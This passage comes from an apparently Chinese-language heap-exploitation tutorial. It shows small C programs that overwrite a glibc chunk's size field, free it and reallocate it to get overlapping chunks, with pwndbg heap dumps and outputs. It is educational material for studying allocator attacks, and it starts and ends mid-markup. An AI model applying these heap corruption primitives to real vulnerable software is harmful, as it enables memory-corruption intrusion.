class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fe1</span><br>&#125;<br><span class="hljs-number">0x602020</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135137</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>发现此时的size是0x21…这里还是想吐槽一些pwndbg把size部分改成了十进制..真的苟..这个docker我忘记改代码了…<br>然后程序继续</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fc1</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135105</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这里已经分配完了,此时的堆</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000000000020fc1<br></code></pre></td></tr></table></figure><p>没有问题,下一步进行size的改写,至于为什么是chunk-8呢,因为我们知道chunk给我们的地址其实是mem的地址,也就是0x602010处,因此减8可以到pre_size处</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里已经改写成功了,此时的heap分析出来的是这样的:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x6666666666663778</span>,<br>  fd_nextsize = <span class="hljs-number">0xa3836356566</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602450</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134065</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>成功通过size欺骗到了ptmalloc机制</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">14</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x303a7274705d2a5b      <span class="hljs-number">0</span>x66666<span class="hljs-number">66666663778</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000a<span class="hljs-number">3836356566</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>然后我们让程序到下一个分配</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x6666666666663778</span>,<br>  fd_nextsize = <span class="hljs-number">0xa3836356566</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602450</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134065</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时这里虽然没变,但是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x ptr1</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">4 = 0x602010</span><br></code></pre></td></tr></table></figure><p>也就是说我们成功分配了free掉的chunk1</p><p>程序运行结果:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">╰─<span class="hljs-comment"># ./fast_in</span><br><span class="hljs-section">[*]ptr:0x180e010</span><br><span class="hljs-section">[*]ptr1:0x180e010</span><br></code></pre></td></tr></table></figure><ol start="2"><li>smallbin</li></ol><p>代码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>  *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>   <span class="hljs-comment">// printf(&quot;[*]%p\n&quot;,&amp;ptr);</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]%p\n&quot;</span>,ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]%p\n&quot;</span>,ptr1);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>程序运行结果:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">╰─# ./pwn<br><span class="hljs-string">[*]</span><span class="hljs-number">0x7a3010</span><br><span class="hljs-string">[*]</span><span class="hljs-number">0x7a3010</span><br></code></pre></td></tr></table></figure><p>这个程序就不做深入分析了,和fastbin的一样</p><h3 id="free状态下"><a href="#free状态下" class="headerlink" title="free状态下"></a>free状态下</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr:%p\n&quot;</span>,ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr:%p\n&quot;</span>,ptr1);<br>&#125;<br></code></pre></td></tr></table></figure><p>程序运行结果:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">╰─# ./pwn<br>[*]<span class="hljs-built_in">ptr</span>:<span class="hljs-number">0x149b010</span><br>[*]<span class="hljs-built_in">ptr</span>:<span class="hljs-number">0x149b010</span><br></code></pre></td></tr></table></figure><p>这个就是先释放,然后才进行大小的更改</p><h3 id="通过extend后向overlapping"><a href="#通过extend后向overlapping" class="headerlink" title="通过extend后向overlapping"></a>通过extend后向overlapping</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第1个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第2个 0x10 的chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第3个 0x10 的chunk3</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第4个 0x10 的chunk4    </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr:%p\n&quot;</span>,ptr);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr:%p\n&quot;</span>,ptr1);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我在第一次分配处下了断点,此时的堆:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fe1</span><br>&#125;<br><span class="hljs-number">0x602020</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135137</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>随后分配完全结束时我们再看</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20f81</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135041</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这时:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602070</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f81</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>随后我们更改了size的大小</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602060</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x411</span><br>&#125;<br><span class="hljs-number">0x602080</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">1041</span>,<br>  fd = <span class="hljs-number">0x303a7274705d2a5b</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0xa30313032303678</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x602490</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134001</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>free之后我们可以看到:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span 